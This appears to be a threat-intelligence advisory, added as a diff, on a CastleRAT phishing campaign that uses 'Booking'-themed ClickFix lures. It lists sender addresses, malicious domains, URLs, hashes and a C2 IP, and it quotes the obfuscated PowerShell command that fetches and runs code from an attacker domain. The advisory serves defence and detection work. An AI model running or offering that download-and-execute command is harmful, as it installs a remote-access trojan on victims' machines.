@@ -1,0 +1,89 @@
+CastleRAT | URLs | ClickFix | "Booking" | 25 September - 2 October 2025
+
+---- Email ----
+
+Message with characteristics (Examples):
+
+From:
+```
+Duy Nguyen Thuy <nguyenthuyduy534@gmail.com>
+Loan Luu Huu <loanluuhuu617@gmail.com>
+[...]
+```
+
+Subject:
+```
+Re: Inquiry About Room Availability
+[...]
+```
+
+---- Description ----
+
+The message contain a link to a "Booking" themed lure using the ClickFix technique. If the user copies and pastes the PowerShell script as instructed, it will execute a second PowerShell script ultimately leading to the installation of CastleRAT.
+
+
+Clickfix Payload:
+```
+powershell -w h -ep b -nop -c "$h='blkiesf.c'+'om/upd';iex(iwr $h -useb).Content"
+```
+
+Example of command executed in the system:
+```
+"C:\Users\USERNA~1\AppData\Local\Temp\consent\cnt.exe" 
+```
+
+---- IOCs ----
+
+ClickFix Landing Example:
+ type: payload
+ urls:
+ - https://update-info3458421.com
+ domains:
+ - request-info3444.com
+ - request345553.com
+ - update-gues3429.com
+ - update-guest4398317809.com
+ - update-info14556.com
+ - update-info1456.com
+ - update-info3458421.com
+
+Clickfix Other URLs:
+ type: payload
+ urls:
+ - https://update-info3458421.com/get/com
+ - https://update-info3458421.com/api?c=1
+ - https://update-info3458421.com/static/vpn/Booking.com_Logo.svg.png
+
+Inline Asset in Landing:
+ type: payload
+ sha256s:
+ - dd86ac08f113211021e8a990a6c856b1673451f42dba09bd8536244f3bacca37
+
+Click Fix Payload Chain:
+ type: payload
+ urls:
+ - https://blkiesf.com/upd
+ - https://blkiesf.com/apip/f/f
+ sha256s:
+ - 0c011eb5032c07eb7eddaec219dbba2c8b671f2e7bfcbb5d2beb6355c2514589
+ - 3790dde12ccad0fb75e206fa4a749e5f5aff4c978127704baa1622936e0b7f2d
+
+Payload Associated Domain:
+ type: payload
+ domains:
+ - blkiesf.com
+ - boikfrs.com
+ - bioskbd.com
+
+CastleRAT Callback:
+ type: payload
+ urls:
+ - http://www.ip-api.com/line/?fields=147457
+ - https://steamcommunity.com/id/krouvhsin34287f7h3
+
+CastleRAT C2:
+ type: c2
+ domains:
+ - programsbookss.com
+ ips:
+ - 178.17.57.102
